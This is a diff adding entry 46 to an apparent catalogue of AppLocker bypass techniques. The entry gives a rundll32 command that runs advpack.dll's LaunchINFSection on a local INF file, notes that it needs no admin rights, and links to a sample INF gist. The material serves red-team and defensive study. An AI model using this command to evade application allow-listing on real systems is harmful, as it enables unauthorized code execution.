@@ -769,3 +769,24 @@ Requires write access to a place that is allowed by AppLocker
 * Links:
   * https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/   
   * https://twitter.com/bohops/status/955659561008017409   
+   
+   
+   
+## 46. Advpack.dll - LaunchINFSection
+
+```
+rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,
+```
+
+* Requires admin: No  
+* Windows binary: Yes  
+* Bypasses AppLocker Default rules: ?
+
+Notes:
+
+
+* Links:
+  * https://twitter.com/bohops/status/967486047839014913    
+  * https://gist.githubusercontent.com/bohops/693dd4d5dbfb500f1c3ace02622d5d34/raw/902ed953a9188b27e91c199b465cddf855c7b94f/test.inf
+
+
